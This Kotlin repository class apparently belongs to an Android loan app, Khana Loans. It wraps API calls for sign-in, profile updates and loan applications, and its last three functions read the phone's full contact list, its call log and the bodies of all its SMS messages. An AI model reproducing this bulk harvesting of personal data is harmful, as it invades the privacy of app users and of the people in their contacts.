package com.khana.loans.repository

import android.annotation.SuppressLint
import android.content.ContentResolver
import android.database.Cursor
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony.Sms
import android.util.Log
import com.google.gson.Gson
import com.khana.loans.MyApplication
import com.khana.loans.R
import com.khana.loans.api.ApiService
import com.khana.loans.api.NetworkState
import com.khana.loans.models.CallLogs
import com.khana.loans.models.Contacts
import com.khana.loans.models.Loans
import com.khana.loans.models.Message
import com.khana.loans.models.Photo
import com.khana.loans.models.ResponseData
import com.khana.loans.models.User
import com.khana.loans.models.UserData
import com.khana.loans.utils.convertSecondsToTime


class Repository(
    private val apiService: ApiService,
    private val application: MyApplication
) {

    suspend fun updateUserData(user: User): NetworkState {
        try {
            val response = apiService.updatepProfile(user)
            return if (response.isSuccessful) {
                NetworkState.Success(response.body())
            } else {
                val errorBody = response.errorBody()
                val errorResponse = errorBody?.let {
                    val gson = Gson()
                    gson.fromJson(it.string(), ResponseData::class.java)
                }
                NetworkState.Error(errorResponse!!.message)
            }
        } catch (ex: Exception) {
            return NetworkState.Error(ex.message!!)
        }
    }

    suspend fun uploadImages(photo: Photo): NetworkState {
        try {
            val response = apiService.uploadUserPhotos(photo)
            return if (response.isSuccessful) {
                NetworkState.Success(response.body())
            } else {
                val errorBody = response.errorBody()
                val errorResponse = errorBody?.let {
                    val gson = Gson()
                    gson.fromJson(it.string(), ResponseData::class.java)
                }
                NetworkState.Error(errorResponse!!.message)
            }
        } catch (exception: Exception) {
            return NetworkState.Error(exception.message!!)
        }

    }

    suspend fun uploadUserData(user: UserData): NetworkState {
        try {
            val response = apiService.uploadUserData(user)
            return if (response.isSuccessful) {
                NetworkState.Success(response.body())
            } else {
                val errorBody = response.errorBody()
                val errorResponse = errorBody?.let {
                    val gson = Gson()
                    gson.fromJson(it.string(), ResponseData::class.java)
                }
                NetworkState.Error(errorResponse!!.message)
            }
        } catch (exception: Exception) {
            return NetworkState.Error(exception.message!!)
        }

    }

    suspend fun signIn(user: User): NetworkState {
        try {
            val response = apiService.signInUser(user)
            return if (response.isSuccessful) {
                NetworkState.Success(response.body())
            } else {
                val errorBody = response.errorBody()
                val errorResponse = errorBody?.let {
                    val gson = Gson()
                    gson.fromJson(it.string(), ResponseData::class.java)
                }
                NetworkState.Error(errorResponse!!.message)
            }
        } catch (exception: Exception) {
            return NetworkState.Error(exception.message!!)
        }

    }

    suspend fun signUp(user: User): NetworkState {
        try {
            val response = apiService.signUpUser(user)

            return if (response.isSuccessful) {
                NetworkState.Success(response.body())
            } else {
                val errorBody = response.errorBody()
                val errorResponse = errorBody?.let {
                    val gson = Gson()
                    gson.fromJson(it.string(), ResponseData::class.java)
                }
                NetworkState.Error(errorResponse!!.message)
            }
        } catch (exception: Exception) {
            return NetworkState.Error(exception.message!!)

        }

    }

    suspend fun applyLoan(loans: Loans): NetworkState {
        try {
            val response = apiService.applyLoan(loans)
            return if (response.isSuccessful) {
                NetworkState.Success(response.body())
            } else {
                val errorBody = response.errorBody()
                val errorResponse = errorBody?.let {
                    val gson = Gson()
                    gson.fromJson(it.string(), ResponseData::class.java)
                }
                NetworkState.Error(errorResponse!!.message)
            }
        } catch (exception: Exception) {
            return NetworkState.Error(exception.message!!)

        }


    }

    suspend fun loanHistory(userId: String): NetworkState {
        try {

            val response = apiService.loanHistory(userId)
            return if (response.isSuccessful) {
                NetworkState.Success(response.body()!!)
            } else {
                val errorBody = response.errorBody()
                val errorResponse = errorBody?.let {
                    val gson = Gson()
                    gson.fromJson(it.string(), ResponseData::class.java)
                }
                NetworkState.Error(errorResponse!!.message)
            }
        } catch (exception: Exception) {
            return NetworkState.Error(exception.message!!)

        }

    }

    @SuppressLint("Range", "Recycle")
    fun getNamePhoneDetails(): MutableList<Contacts> {
        val names = mutableListOf<Contacts>()
        val cr = application.contentResolver
        val cur = cr.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
            null, null, null
        )
        if (cur!!.count > 0) {
            while (cur.moveToNext()) {
                val id =
                    cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NAME_RAW_CONTACT_ID))
                val name =
                    cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val number =
                    cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                names.add(Contacts(name, number))
            }
        }
        return names
    }

    @SuppressLint("Range")
    fun getCallDetails(): List<CallLogs> {
        val lstCalls = ArrayList<CallLogs>()
        val cursor: Cursor = application.contentResolver
            .query(CallLog.Calls.CONTENT_URI, null, null, null, null)!!
        while (cursor.moveToNext()) {
            val number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER))
            val type =
                when (cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE))) {
                    CallLog.Calls.INCOMING_TYPE.toString() -> {
                        application.getString(R.string.incoming)
                    }

                    CallLog.Calls.REJECTED_TYPE.toString() -> {
                        application.getString(R.string.rejected)
                    }

                    CallLog.Calls.BLOCKED_TYPE.toString() -> {
                        application.getString(R.string.blocked)
                    }

                    CallLog.Calls.OUTGOING_TYPE.toString() -> {
                        application.getString(R.string.outgoing)
                    }

                    CallLog.Calls.MISSED_TYPE.toString() -> {
                        application.getString(R.string.missed_call)
                    }

                    else -> {
                        ""
                    }
                }

            val time =
                convertSecondsToTime(
                    cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)).toLong()
                )

            val call = CallLogs(number, type, time)
            lstCalls.add(call)
        }
        cursor.close()
        return lstCalls
    }

    @SuppressLint("Range")
    fun getMessages(): ArrayList<Message> {
        val contentResolver: ContentResolver = application.contentResolver
        val lstMessage: ArrayList<Message> = ArrayList()
        val cursor = contentResolver.query(
            Sms.CONTENT_URI,
            null,
            null,
            null,
            null
        )

        if (cursor != null && cursor.moveToFirst()) {
            do {
                val address = cursor.getString(cursor.getColumnIndexOrThrow(Sms.ADDRESS))
                val body = cursor.getString(cursor.getColumnIndexOrThrow(Sms.BODY))
                val type = cursor.getString(cursor.getColumnIndex(Sms.TYPE))
                var sender = ""
                var reciever = ""
                when (type.toInt()) {
                    Sms.MESSAGE_TYPE_SENT -> {
                        sender = "Self"
                        reciever = address
                    }

                    Sms.MESSAGE_TYPE_INBOX -> {
                        reciever = "Self"
                        sender = address
                    }
                }
                val message = Message(sender, reciever, body)
                lstMessage.add(message)
            } while (cursor.moveToNext())
        }

        cursor?.close()
        return lstMessage
    }


}